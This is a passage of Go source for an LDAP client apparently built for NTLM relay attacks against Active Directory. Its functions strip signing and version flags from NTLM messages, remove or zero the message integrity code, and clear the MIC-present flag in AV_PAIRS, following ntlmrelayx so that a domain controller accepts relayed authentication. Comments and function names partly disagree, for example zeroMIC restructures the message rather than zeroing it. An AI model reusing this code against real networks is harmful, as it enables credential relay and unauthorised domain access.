		// Try to extract diagnostic message if available
		var diagMsg string
		if len(bindResponse.Children) >= 3 {
			// BindResponse child 1 is matchedDN, child 2 is diagnosticMessage
			if bindResponse.Children[2].Tag == ber.TagOctetString {
				diagMsg = string(bindResponse.Children[2].Data.Bytes())
			}
		}

		if diagMsg != "" {
			c.logger.Error(fmt.Sprintf("LDAP error: %s", diagMsg))
			return fmt.Errorf("LDAP bind failed with result code %d: %s", code, diagMsg)
		}

		return fmt.Errorf("LDAP bind failed with result code: %d", code)
	}

	c.logger.Debug("SICILY bind successful")
	return nil
}

// sendPacket sends an LDAP packet
func (c *LDAPClient) sendPacket(packet *ber.Packet) error {
	data := packet.Bytes()

	c.logger.Debug(fmt.Sprintf("Sending LDAP packet hex: %x", data))

	_, err := c.rawConn.Write(data)
	if err != nil {
		return fmt.Errorf("failed to write LDAP packet: %w", err)
	}

	c.logger.Debug(fmt.Sprintf("Sent LDAP packet (%d bytes)", len(data)))

	return nil
}

// receivePacket receives an LDAP packet
func (c *LDAPClient) receivePacket() (*ber.Packet, error) {
	// Read LDAP packet from connection
	// LDAP uses BER encoding, we need to read the length first

	// Read first 2 bytes to get the tag and length indicator
	header := make([]byte, 2)
	_, err := io.ReadFull(c.rawConn, header)
	if err != nil {
		return nil, fmt.Errorf("failed to read packet header: %w", err)
	}

	c.logger.Debug(fmt.Sprintf("Received packet header: %02x %02x (tag=0x%02x, len indicator=0x%02x)", header[0], header[1], header[0], header[1]))

	// Check for connection close (00 00)
	if header[0] == 0 && header[1] == 0 {
		return nil, fmt.Errorf("connection closed by server (received 00 00)")
	}

	// Validate tag is a SEQUENCE (0x30)
	if header[0] != 0x30 {
		return nil, fmt.Errorf("invalid BER tag: expected 0x30 (SEQUENCE), got 0x%02x", header[0])
	}

	// Calculate total length needed
	var length int
	if header[1] < 128 {
		// Short form
		length = int(header[1])
	} else {
		// Long form
		numBytes := int(header[1] & 0x7f)
		lengthBytes := make([]byte, numBytes)
		_, err := io.ReadFull(c.rawConn, lengthBytes)
		if err != nil {
			return nil, fmt.Errorf("failed to read length bytes: %w", err)
		}

		// Reconstruct header with length bytes
		header = append(header, lengthBytes...)

		// Calculate length
		length = 0
		for i := 0; i < numBytes; i++ {
			length = (length << 8) | int(lengthBytes[i])
		}
	}

	// Read the rest of the packet
	data := make([]byte, length)
	_, err = io.ReadFull(c.rawConn, data)
	if err != nil {
		return nil, fmt.Errorf("failed to read packet data: %w", err)
	}

	// Combine header and data
	fullPacket := append(header, data...)

	c.logger.Debug(fmt.Sprintf("Received LDAP packet (%d bytes)", len(fullPacket)))

	// Decode BER packet
	packet := ber.DecodePacket(fullPacket)

	return packet, nil
}

// wrapNTLMInSPNEGO wraps NTLM message in SPNEGO
func (c *LDAPClient) wrapNTLMInSPNEGO(ntlmMsg []byte, isType1 bool) []byte {
	if isType1 {
		// NegTokenInit for Type 1
		// Build the complete SPNEGO wrapper with proper length calculation
		mechTokenLen := len(ntlmMsg) + 2       // OCTET STRING tag + length + data
		innerSeqLen := 0x0e + mechTokenLen + 2 // mechTypes + mechToken
		outerContextLen := innerSeqLen + 2     // SEQUENCE wrapper
		totalLen := 0x08 + outerContextLen + 2 // OID + context

		result := make([]byte, 0, totalLen+2)
		result = append(result, 0x60, byte(totalLen))                                                   // Application 0
		result = append(result, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02)                         // SPNEGO OID
		result = append(result, 0xa0, byte(outerContextLen))                                            // Context 0
		result = append(result, 0x30, byte(innerSeqLen))                                                // SEQUENCE
		result = append(result, 0xa0, 0x0e)                                                             // Context 0 (mechTypes)
		result = append(result, 0x30, 0x0c)                                                             // SEQUENCE
		result = append(result, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a) // NTLMSSP OID
		result = append(result, 0xa2, byte(mechTokenLen))                                               // Context 2 (mechToken)
		result = append(result, 0x04, byte(len(ntlmMsg)))                                               // OCTET STRING
		result = append(result, ntlmMsg...)                                                             // Actual NTLM Type 1 message
		return result
	}

	// NegTokenResp for Type 3
	result := make([]byte, 0)
	result = append(result, 0xa1)                   // NegTokenResp tag
	result = append(result, byte(len(ntlmMsg)+4+2)) // length
	result = append(result, 0x30)                   // SEQUENCE
	result = append(result, byte(len(ntlmMsg)+4))   // length
	result = append(result, 0xa2)                   // responseToken tag
	result = append(result, byte(len(ntlmMsg)+2))   // length
	result = append(result, 0x04)                   // OCTET STRING
	result = append(result, byte(len(ntlmMsg)))     // length
	result = append(result, ntlmMsg...)
	return result
}

// unwrapSPNEGO extracts NTLM message from SPNEGO
func (c *LDAPClient) unwrapSPNEGO(spnego []byte) ([]byte, error) {
	// Parse SPNEGO to extract NTLM Type 2
	// This is a simplified parser - full SPNEGO parsing would use ASN.1

	// Look for NTLMSSP signature (0x4e544c4d53535000)
	ntlmSig := []byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00}

	for i := 0; i < len(spnego)-8; i++ {
		if bytes.Equal(spnego[i:i+8], ntlmSig) {
			// Found NTLMSSP signature, return from here to end
			return spnego[i:], nil
		}
	}

	return nil, fmt.Errorf("NTLMSSP signature not found in SPNEGO")
}

// removeSigningFlags removes signing-related flags from NTLM Type 1
// This prevents the client from generating a MIC in Type 3
func (c *LDAPClient) removeSigningFlags(type1 []byte) []byte {
	if len(type1) < 20 {
		return type1
	}

	// Make a copy
	modified := make([]byte, len(type1))
	copy(modified, type1)

	// Flags are at offset 12 (4 bytes, little-endian)
	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
	)

	flags := binary.LittleEndian.Uint32(modified[12:16])

	// Remove signing flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_SIGN flag from Type 1")
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag from Type 1")
	}

	binary.LittleEndian.PutUint32(modified[12:16], flags)
	return modified
}

// simpleMICZero zeros out the MIC field in NTLM Type 3 without restructuring the message
// This is needed when we modify Type 1 flags - the MIC becomes invalid but we keep the field
func (c *LDAPClient) simpleMICZero(type3 []byte) []byte {
	// NTLM Type 3 with VERSION + MIC:
	// Offset 60-63: Flags
	// Offset 64-71: Version (8 bytes) - present if NEGOTIATE_VERSION flag set
	// Offset 72-87: MIC (16 bytes) - present if Version present

	if len(type3) < 88 {
		// No room for VERSION+MIC, return as-is
		return type3
	}

	// Check if VERSION flag is set
	const NTLMSSP_NEGOTIATE_VERSION = 0x02000000
	flags := binary.LittleEndian.Uint32(type3[60:64])
	if (flags & NTLMSSP_NEGOTIATE_VERSION) == 0 {
		// No VERSION/MIC present
		return type3
	}

	// Zero the MIC at offset 72-87 (16 bytes)
	modified := make([]byte, len(type3))
	copy(modified, type3)
	for i := 72; i < 88; i++ {
		modified[i] = 0
	}

	c.logger.Debug("Zeroed MIC field in Type 3 (16 bytes at offset 72-87)")
	return modified
}

// zeroMIC simply zeros out the MIC field without removing it or adjusting offsets
// This is simpler and preserves the message structure
func (c *LDAPClient) zeroMIC(type3 []byte) []byte {
	// Parse NTLM Type 3 message and modify it like ntlmrelayx does:
	// 1. Remove SIGN, ALWAYS_SIGN, KEY_EXCH, VERSION flags
	// 2. Set MIC to empty (not present)
	// 3. Set Version to empty (not present)
	// This requires reconstructing the message without the VERSION and MIC fields

	if len(type3) < 64 {
		c.logger.Debug("Type 3 too short, using as-is")
		return type3
	}

	// NTLM Type 3 structure (without optional fields):
	// Offset 0-7: Signature "NTLMSSP\0"
	// Offset 8-11: Message Type (0x03000000)
	// Offset 12-19: LM Response (len, maxlen, offset)
	// Offset 20-27: NTLM Response (len, maxlen, offset)
	// Offset 28-35: Domain (len, maxlen, offset)
	// Offset 36-43: User (len, maxlen, offset)
	// Offset 44-51: Workstation (len, maxlen, offset)
	// Offset 52-59: Session Key (len, maxlen, offset)
	// Offset 60-63: Flags
	// [Optional 64-71: Version - 8 bytes if NEGOTIATE_VERSION flag]
	// [Optional 72-87: MIC - 16 bytes if Version present]

	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
		NTLMSSP_NEGOTIATE_KEY_EXCH    = 0x40000000
		NTLMSSP_NEGOTIATE_VERSION     = 0x02000000
	)

	flags := binary.LittleEndian.Uint32(type3[60:64])
	hasVersion := (flags & NTLMSSP_NEGOTIATE_VERSION) != 0

	// Remove problematic flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_KEY_EXCH != 0 {
		flags ^= NTLMSSP_NEGOTIATE_KEY_EXCH
	}
	if hasVersion {
		flags ^= NTLMSSP_NEGOTIATE_VERSION
	}

	// Build new message
	var result []byte

	if !hasVersion || len(type3) < 88 {
		// No VERSION/MIC to remove, just update flags
		result = make([]byte, len(type3))
		copy(result, type3)
		binary.LittleEndian.PutUint32(result[60:64], flags)
		c.logger.Debug("Updated flags (no VERSION/MIC present)")
		return result
	}

	// Need to remove VERSION (8 bytes) and MIC (16 bytes) = 24 bytes total
	// and adjust all offsets

	// Read all field descriptors (len, maxlen, offset)
	type fieldDesc struct {
		pos    int    // position in header
		length uint16 // field length
		offset uint32 // original offset
	}

	fields := []fieldDesc{
		{12, binary.LittleEndian.Uint16(type3[12:14]), binary.LittleEndian.Uint32(type3[16:20])}, // LM
		{20, binary.LittleEndian.Uint16(type3[20:22]), binary.LittleEndian.Uint32(type3[24:28])}, // NTLM
		{28, binary.LittleEndian.Uint16(type3[28:30]), binary.LittleEndian.Uint32(type3[32:36])}, // Domain
		{36, binary.LittleEndian.Uint16(type3[36:38]), binary.LittleEndian.Uint32(type3[40:44])}, // User
		{44, binary.LittleEndian.Uint16(type3[44:46]), binary.LittleEndian.Uint32(type3[48:52])}, // Workstation
		{52, binary.LittleEndian.Uint16(type3[52:54]), binary.LittleEndian.Uint32(type3[56:60])}, // SessionKey
	}

	// Sort fields by original offset to preserve payload order
	// Use a simple bubble sort since we only have 6 fields
	for i := 0; i < len(fields)-1; i++ {
		for j := 0; j < len(fields)-i-1; j++ {
			if fields[j].offset > fields[j+1].offset {
				fields[j], fields[j+1] = fields[j+1], fields[j]
			}
		}
	}

	// Build new header (64 bytes, no VERSION/MIC)
	result = make([]byte, 64)
	copy(result[0:60], type3[0:60])
	binary.LittleEndian.PutUint32(result[60:64], flags)

	// Build payload in original order and calculate new offsets
	currentOffset := uint32(64) // Start of payload in new message

	for _, field := range fields {
		// Skip zero-length fields
		if field.length == 0 {
			binary.LittleEndian.PutUint32(result[field.pos+4:field.pos+8], currentOffset)
			continue
		}

		// Update offset in header
		binary.LittleEndian.PutUint32(result[field.pos+4:field.pos+8], currentOffset)

		// Copy field data if present
		if int(field.offset+uint32(field.length)) <= len(type3) {
			result = append(result, type3[field.offset:field.offset+uint32(field.length)]...)
			currentOffset += uint32(field.length)
		}
	}

	// Clear the MIC_PROVIDED flag in AV_PAIRS
	result = c.clearMICFlagInAVPairs(result)

	c.logger.Debug(fmt.Sprintf("Removed VERSION/MIC and updated flags (size: %d -> %d)", len(type3), len(result)))
	return result
}

// removeMICFromType3 removes MIC and other problematic fields from NTLM Type 3
// This matches what ntlmrelayx does: removing VERSION and MIC fields entirely
// and adjusting all offsets in the message header
func (c *LDAPClient) removeMICFromType3(type3 []byte) []byte {
	if len(type3) < 88 {
		return type3
	}

	// Flags are at offset 60 (4 bytes)
	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
		NTLMSSP_NEGOTIATE_KEY_EXCH    = 0x40000000
		NTLMSSP_NEGOTIATE_VERSION     = 0x02000000
	)

	flags := binary.LittleEndian.Uint32(type3[60:64])

	// Remove signing and other flags
	originalFlags := flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_KEY_EXCH != 0 {
		flags ^= NTLMSSP_NEGOTIATE_KEY_EXCH
	}

	// Check if VERSION flag is set - if so, we need to remove VERSION and MIC fields
	hasVersion := (originalFlags & NTLMSSP_NEGOTIATE_VERSION) != 0

	if hasVersion {
		// Remove VERSION flag
		flags ^= NTLMSSP_NEGOTIATE_VERSION

		// NTLM Type 3 structure with VERSION and MIC:
		// Offset 0-7: Signature "NTLMSSP\0"
		// Offset 8-11: Message Type (0x03000000)
		// Offset 12-19: LM Response (len, maxlen, offset)
		// Offset 20-27: NTLM Response (len, maxlen, offset)
		// Offset 28-35: Domain (len, maxlen, offset)
		// Offset 36-43: User (len, maxlen, offset)
		// Offset 44-51: Workstation (len, maxlen, offset)
		// Offset 52-59: Session Key (len, maxlen, offset)
		// Offset 60-63: Flags
		// Offset 64-71: Version (8 bytes) - only if NEGOTIATE_VERSION flag set
		// Offset 72-87: MIC (16 bytes) - only if NEGOTIATE_VERSION flag set
		// Offset 88+: Variable fields (domain, user, host, LM, NTLM, session key)

		// Make a copy to work with
		modified := make([]byte, len(type3))
		copy(modified, type3)

		// Update flags
		binary.LittleEndian.PutUint32(modified[60:64], flags)

		// Adjust all offsets that point past VERSION+MIC (offset >= 88) by -24
		// Each security buffer is: [len(2) + maxlen(2) + offset(4)] = 8 bytes
		// The offset field is at position +4 within each buffer descriptor
		offsetPositions := []int{16, 24, 32, 40, 48, 56} // Offset field positions

		for _, pos := range offsetPositions {
			if pos+4 <= len(modified) {
				offset := binary.LittleEndian.Uint32(modified[pos : pos+4])
				if offset >= 88 {
					// Subtract VERSION (8) + MIC (16) = 24 bytes
					binary.LittleEndian.PutUint32(modified[pos:pos+4], offset-24)
				}
			}
		}

		// Build new message: header (64 bytes) + everything after VERSION+MIC (from offset 88)
		// Only remove 24 bytes (VERSION + MIC), keep all payload data including session key
		final := make([]byte, 0, len(type3)-24)
		final = append(final, modified[0:64]...) // Header with adjusted offsets
		final = append(final, modified[88:]...)  // Payload (skip VERSION+MIC at 64-87)

		// Clear MIC Present flag in AV_PAIRS within the NTLMv2 response
		final = c.clearMICFlagInAVPairs(final)

		c.logger.Debug(fmt.Sprintf("Removed MIC and VERSION from Type 3 (24 bytes removed, new size: %d)", len(final)))
		return final
	} else {
		// No VERSION field, just update flags
		modified := make([]byte, len(type3))
		copy(modified, type3)
		binary.LittleEndian.PutUint32(modified[60:64], flags)

		c.logger.Debug("Removed signing flags from Type 3 (no VERSION/MIC to remove)")
		return modified
	}
}

// clearMICFlagInAVPairs clears the MIC Present flag (0x00000002) in the AV_PAIRS
// within the NTLMv2 response blob. This is necessary because even though we remove
// the MIC field from the message, the AV_PAIRS still indicate MIC is present,
// causing the DC to reject authentication.
func (c *LDAPClient) clearMICFlagInAVPairs(type3 []byte) []byte {
	// NTLM Response descriptor is at offset 20-27
	if len(type3) < 28 {
		return type3
	}

	ntlmRespLen := binary.LittleEndian.Uint16(type3[20:22])
	ntlmRespOffset := binary.LittleEndian.Uint32(type3[24:28])

	if ntlmRespOffset+uint32(ntlmRespLen) > uint32(len(type3)) {
		c.logger.Debug("Invalid NTLM response offset/length, skipping AV_PAIRS modification")
		return type3
	}

	// NTLMv2 Response structure:
	// Offset 0-15: Response (HMAC-MD5)
	// Offset 16: RespType (0x01)
	// Offset 17: HiRespType (0x01)
	// Offset 18-19: Reserved1
	// Offset 20-23: Reserved2
	// Offset 24-31: TimeStamp
	// Offset 32-39: ChallengeFromClient
	// Offset 40-43: Reserved3
	// Offset 44+: AV_PAIRS (attribute-value pairs)

	// Make sure we have at least the header
	if ntlmRespLen < 44 {
		c.logger.Debug("NTLMv2 response too short for AV_PAIRS")
		return type3
	}

	// Make a copy to modify
	modified := make([]byte, len(type3))
	copy(modified, type3)

	// Parse AV_PAIRS starting at offset 44 within the NTLMv2 response
	avPairsStart := ntlmRespOffset + 44
	offset := avPairsStart

	for offset < ntlmRespOffset+uint32(ntlmRespLen)-4 {
		avID := binary.LittleEndian.Uint16(modified[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(modified[offset+2 : offset+4])

		if avID == 0 { // MsvAvEOL
			break
		}

		// MsvAvFlags = 6
		if avID == 6 && avLen == 4 {
			flags := binary.LittleEndian.Uint32(modified[offset+4 : offset+8])
			const MIC_PRESENT = 0x00000002

			if flags&MIC_PRESENT != 0 {
				// Clear the MIC Present flag
				flags &^= MIC_PRESENT
				binary.LittleEndian.PutUint32(modified[offset+4:offset+8], flags)
				c.logger.Debug("Cleared MIC Present flag in AV_PAIRS")
			}
			break // We found and modified MsvAvFlags, we're done
		}

		offset += 4 + uint32(avLen)
	}

	return modified
}
